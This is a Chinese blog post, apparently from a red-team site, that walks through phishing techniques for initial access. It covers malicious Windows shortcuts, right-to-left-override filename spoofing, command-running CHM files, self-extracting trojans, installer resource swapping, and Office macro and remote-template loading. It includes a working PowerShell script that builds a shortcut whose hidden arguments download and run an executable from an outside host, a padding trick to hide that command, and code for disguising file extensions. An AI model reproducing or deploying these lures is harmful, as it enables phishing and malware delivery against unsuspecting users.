> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.chabug.org](https://www.chabug.org/tools/2017.html)

[syst1m](https://www.chabug.org/author/syst1m) • 2021 年 1 月 4 日 pm7:23 • [工具分享](https://www.chabug.org/topics/tools), [渗透测试](https://www.chabug.org/topics/web) • 阅读 588

*   前言

**在常年攻防演练以及红蓝对抗中常被用于红方攻击的一种进行打点的方式，由于本人只是个安服仔，接触的比较少（但也不能不学），就有了这篇文章，参考各位大佬的姿势总结一下。**

钓鱼手段
----

### Lnk（快捷方式）

可以在 “⽬标” 栏写⼊⾃⼰的恶意命令，如 powershell 上线命令等，这里举例为 CMD

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103160612-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103160612-1.png)

当我点击谷歌浏览器时，弹出了 CMD

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103160947-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103160947-1.png)

可以进行更改图标

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103161253-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103161253-1.png)

*   快速生成 lnk 样本

```
$WshShell = New-Object -comObject WScript.Shell  
$Shortcut = $WshShell.CreateShortcut("test.lnk")  
$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"  
$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"  
$Shortcut.Arguments = "cmd /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).DownloadFile('http://192.168.1.7:8000/ascotbe.exe','.\\ascotbe.exe');&cmd /c .\\ascotbe.exe"  
$Shortcut.Save()
```

运行

```
powershell -ExecutionPolicy RemoteSigned -file test.ps1
```

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103163314-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103163314-1.png)

*   Tips

**目标文件位置所能显示最大字符串为 260 个，所有我们可以把执行的命令放在 260 个字符后面**

```
$file = Get-Content ".\test.txt"  
$WshShell = New-Object -comObject WScript.Shell  
$Shortcut = $WshShell.CreateShortcut("test.lnk")  
$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"  
$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"  
$Shortcut.Arguments = '                                                                                                                                                                                                                                      '+ $file  
$Shortcut.Save()
```

文件后缀 RTLO
---------

**他会让字符串倒着编码**

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103174703-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103174703-1.png)

*   用 Python 一键生成用，把 txt 改为 png 后缀

```
import os  
os.rename('test.txt', 'test-\u202egnp.txt')
```

```
import os
os.rename('cmd.exe', u'no\u202eFDP.exe')
```

CHM 文档
------

创建一个文件夹（名字随意），在文件夹里面再创建两个文件夹（名字随意）和一个 index.html 文件，在两个文件夹内部创建各创建一个 index.html 文件。然后先将下列代码复制到根文件夹中的 index.html 中

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103180223-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103180223-1.png)

*   在 index.html 文件中编辑

```
<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
command exec
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM >
 <PARAM >
 <PARAM  value=',calc.exe'>
 <PARAM >
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
```

*   使用 cs 生成修改模版中的 calc.exe

```
<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
command exec
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM >
 <PARAM >
 <PARAM >
 <PARAM >
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
```

*   使用 EasyCHM 编译

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103181650-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103181650-1.png)

*   原有模版 CMD

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103181750-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103181750-1.png)

*   ps 上线

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103182926-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103182926-1.png)

自解压
---

*   使用 CS 生成木马

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103183747-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103183747-1.png)

*   创建自解压文件

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103184022-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103184022-1.png)

*   高级自解压选项

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103184233-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103184233-1.png)

*   解压路径 - 绝对路径

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103184310-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103184310-1.png)

*   提取后运行

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103185602-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103185602-1.png)

*   静默模式

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103184559-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103184559-1.png)

*   更新模式

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103184719-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103184719-1.png)

*   修改文件名

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103185941-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103185941-1.png)

### ResourceHacker

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103190216-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103190216-1.png)

*   打开 flash 安装文件导出资源

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103190401-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103190401-1.png)

*   替换资源文件

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103190557-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103190557-1.png)

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103190647-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103190647-1.png)

*   上线

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103190751-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103190751-1.png)

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103190834-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103190834-1.png)

office 宏
--------

### 本地加载

*   新建 word，创建宏

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103191509-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103191509-1.png)

*   cs 生成宏粘贴

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103191615-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103191615-1.png)

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103191756-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103191756-1.png)

*   保存为启用宏的文档

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103191858-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103191858-1.png)

*   打开文档上线

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103220610-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103220610-1.png)

### 远程加载

编写一个带有宏代码的 DOTM 文档，并启用一个 http 服务将 DOTM 放置于 web 下  
[](https://www.chabug.org/wp-content/uploads/2021/01/20210104090953-1.png)

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210104090953-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210104090953-1.png)

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210104091023-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210104091023-1.png)

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210104192755.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210104192755.png)

*   新建一个任意的模版的 docx 文档并且解压

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210104091336-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210104091336-1.png)

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210103222742-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210103222742-1.png)

*   编辑 settings.xml.rels 文件中的 Target 为我们第一个 DOTM 的 http 地址

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210104092324-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210104092324-1.png)

*   重新压缩改后缀名为. docx

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210104092252-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210104092252-1.png)

*   模拟点击上线

[![](https://www.chabug.org/wp-content/uploads/2021/01/20210104185613-1.png)](https://www.chabug.org/wp-content/uploads/2021/01/20210104185613-1.png)

参考
--

https://www.ascotbe.com/2020/07/26/office_0x01/#LNK%E9%92%93%E9%B1%BC

https://paper.seebug.org/1329/

[利用 winrar 自解压捆版 payload 制作免杀钓鱼木马](https://www.baikesec.com/webstudy/still/77.html)

原创文章，作者：syst1m，未经授权禁止转载！如若转载，请联系作者：syst1m